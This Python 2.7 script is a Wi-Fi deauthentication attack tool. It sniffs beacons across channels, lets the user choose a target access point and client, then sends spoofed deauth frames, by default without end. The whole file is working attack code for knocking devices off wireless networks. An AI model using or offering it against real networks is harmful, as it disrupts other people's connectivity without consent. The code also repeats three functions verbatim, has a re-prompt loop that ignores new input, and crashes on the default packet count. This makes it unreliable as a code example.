# !usr/bin/env/python
#
# File:     deauth.py
# Author:   Alex Thompson
# Github:   palex88@github.com
# Python    Version: 2.7
# Purpose:  This script is used to search out local networks, then send deauth packets to the network from a spoofed mac
#           address. Deauth packets will, in theory, tell the wireless base station to drop the connetion to the
#           spoofed host.
# Usage:    python deauth.py -i <network interface>
# Notes:    The network interface need to be set to monitor mode before running. This can be done with airmon-ng.
# Resources:
#   http://www.bitforestinfo.com/2017/06/how-to-create-and-send-wireless-deauthentication-packets-using-python-and-scapy.html
#   https://thepacketgeek.com/scapy-sniffing-with-custom-actions-part-1/
#   https://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html
#   https://github.com/veerendra2/wifi-deauth-attack
#   https://en.wikipedia.org/wiki/IEEE_802.11w-2009
#   https://www.androidauthority.com/capture-data-open-wi-fi-726356/

import argparse
from multiprocessing import Process
import threading
from scapy.layers.dot11 import Dot11Elt, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Deauth
from scapy.all import *
import signal
import os
import random
import time
import sys


def add_network(pckt, known_networks):
    # Check to see if it's a hidden SSID (this could be resolved later using out Deauth attack)
    essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info and pckt[Dot11Elt].info != '' else 'Hidden SSID'
    bssid = pckt[Dot11].addr3
    # This insight was included in airoscapy.py (http://www.thesprawl.org/projects/airoscapy/)
    channel = int(ord(pckt[Dot11Elt:3].info))
    if bssid not in known_networks:
        known_networks[bssid] = (essid, channel)
        print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)


def channel_hopper(interface):
    while True:
        try:
            channel = random.randrange(1, 13)
            os.system("iwconfig %s channel %d" % (interface, channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break


def stop_channel_hop(signal, frame):
    # set the stop_sniff variable to True to stop the sniffer
    global stop_sniff
    stop_sniff = True
    channel_hop.terminate()
    channel_hop.join()


def keep_sniffing(pckt):
    return stop_sniff


def channel_hopper(interface):
    while True:
        try:
            channel = random.randrange(1, 13)
            os.system("iwconfig %s channel %d" % (interface, channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break


def stop_channel_hop(signal, frame):
    # set the stop_sniff variable to True to stop the sniffer
    global stop_sniff
    stop_sniff = True
    channel_hop.terminate()
    channel_hop.join()


def keep_sniffing(pckt):
    return stop_sniff


def perform_deauth(bssid, client, count):
    pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    cli_to_ap_pckt = None
    if client != 'FF:FF:FF:FF:FF:FF': cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
    print 'Sending Deauth to ' + client + ' from ' + bssid
    if not count:
        print 'Press CTRL+C to quit'
    # Send the packets in bursts of 64, then sleep for half a sec or so
    while count != 0:
        try:
            for i in range(64):
                # Send out deauth from the AP
                send(pckt)
                # If we're targeting a client, we will also spoof deauth from the client to the AP
                if client != 'FF:FF:FF:FF:FF:FF':
                    scapy.all.send(cli_to_ap_pckt)
                # If count was -1, this will be an infinite loop
                count -= 1
        except KeyboardInterrupt:
            break


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='aircommand.py - Utilize many wireless security features using the Scapy python module')
    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True,
                        help='Interface to use for sniffing and packet injection')
    args = parser.parse_args()
    networks = {}
    stop_sniff = False
    print 'Press CTRL+c to stop sniffing..'
    print '=' * 100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel', 'ESSID', 'BSSID') + '=' * 100
    channel_hop = Process(target=channel_hopper, args=(args.interface,))
    channel_hop.start()
    signal.signal(signal.SIGINT, stop_channel_hop)
    # Sniff Beacon and Probe Response frames to extract AP info
    sniff(lfilter=lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), stop_filter=keep_sniffing,
          prn=lambda x: add_network(x, networks))
    # Reset our signal handler
    signal.signal(signal.SIGINT, signal.SIG_DFL)
    target_bssid = raw_input('Enter a BSSID to perform an deauth attack (q to quit): ')
    while target_bssid not in networks:
        if target_bssid == 'q': sys.exit(0)
        raw_input('BSSID not detected... Please enter another (q to quit): ')
    # Get our interface to the correct channel
    print 'Changing ' + args.interface + ' to channel ' + str(networks[target_bssid][1])
    os.system("iwconfig %s channel %d" % (args.interface, networks[target_bssid][1]))
    # Now we have a bssid that we have detected, let's get the client MAC
    target_client = raw_input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
    if not target_client: target_client = 'FF:FF:FF:FF:FF:FF'
    deauth_pckt_count = int(raw_input('Number of deauth packets (Default: -1 [constant]): '))
    if not deauth_pckt_count:
        deauth_pckt_count = int(-1)
    perform_deauth(target_bssid, target_client, deauth_pckt_count)
